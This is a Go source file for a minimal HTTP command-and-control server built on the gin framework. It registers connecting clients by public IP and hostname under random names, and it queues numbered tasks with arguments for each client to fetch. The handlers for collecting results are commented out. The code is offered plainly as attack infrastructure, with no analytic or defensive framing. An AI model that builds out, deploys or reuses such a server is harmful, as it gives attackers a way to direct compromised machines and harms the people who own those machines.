package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
)

type register struct {
	Name     string `json:"name"`   // random name
	IP       string `json:"ip"`     // public IP
	Hostname string `json:"host"`   // hostname
	Type     string `json:"type"`   // type
}

type task struct {
	Name string `json:"name"` // name
	ID   int    `json:"id"`   // 1 = func ...; 2 = func ...
	Arg1 string `json:"arg1"` // argv[1]
	Arg2 string `json:"arg2"` // argv[2]
}

type result struct {
	Name    string `json:"name"`
	Status  int    `json:"status"`  // 0 = gud; 1 = bad
	Content string `json:"content"` // NOTE: to translate JSON to struct use unmarshall
}

var users []register
var tasks []task
var results []result

func getUsers(c *gin.Context) {
	c.IndentedJSON(http.StatusOK, users)
}

func addUser(c *gin.Context) {
	var newUser register

	// Bind JSON payload to newUser
	if err := c.BindJSON(&newUser); err != nil {
		c.IndentedJSON(http.StatusBadRequest, gin.H{"message": "invalid request payload"})
		return
	}

	// Generate a random name and get the client's IP address
	newUser.Name = generateRandomString(6)
	newUser.IP = c.ClientIP()
	if newUser.IP == "" {
		c.IndentedJSON(http.StatusBadRequest, gin.H{"message": "failed to detect IP address"})
		return
	}

	// Check for duplicate IP
	for _, user := range users {
		if user.IP == newUser.IP {
			c.IndentedJSON(http.StatusConflict, gin.H{"message": "IP already exists"})
			return
		}
	}

	// Add new user to the list
	newUser.Type = "POST"
	users = append(users, newUser)
	fmt.Println(newUser)
	c.IndentedJSON(http.StatusCreated, newUser)
}

func getUserByName(c *gin.Context) {
	name := c.Param("name")

	for _, a := range users {
		if a.Name == name {
			c.IndentedJSON(http.StatusOK, a)
			return
		}
	}
	c.IndentedJSON(http.StatusNotFound, gin.H{"message": "user not found"})
}

func generateRandomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	rand.Seed(time.Now().UnixNano())
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func fetchTasks(c *gin.Context) {
	name := c.Param("name")

	var userTasks []task
	for _, a := range tasks {
		if a.Name == name {
			userTasks = append(userTasks, a)
		}
	}
	if len(userTasks) > 0 {
		c.IndentedJSON(http.StatusOK, userTasks)
		return
	}
	c.IndentedJSON(http.StatusNotFound, gin.H{"message": "could not find any tasks..."})
}

func postTask(c *gin.Context) {
	var newTask task
	user := c.Param("name")

	for _, a := range users {
		if a.Name == user {
			if err := c.BindJSON(&newTask); err != nil {
				c.IndentedJSON(http.StatusBadRequest, gin.H{"message": "failed to add new task"})
				return
			}
			newTask.Name = user
			tasks = append(tasks, newTask)
			c.IndentedJSON(http.StatusCreated, gin.H{"message": "added new task to waitlist"})
			return
		}
	}
	c.IndentedJSON(http.StatusNotFound, gin.H{"message": "did not find user with specified name"})
}

func main() {
	var IP string
	var Port string

	fmt.Println("---------[ Command & Control Server ]---------")
	fmt.Print("Host IP: ")
	fmt.Scanln(&IP)
	fmt.Print("Host Port: ")
	fmt.Scanln(&Port)

	/*---------[ HTTP STUFF ]---------*/
	router := gin.Default()
	router.GET("/users", getUsers)
	router.POST("/users", addUser)
	router.GET("/users/:name", getUserByName)
	router.GET("/tasks/:name", fetchTasks)
	router.POST("/tasks/:name", postTask)
	/*
		router.GET("/results/:name", getResults)
		router.POST("/results/:name", postResults)
	*/
	router.Run(IP + ":" + Port)
}

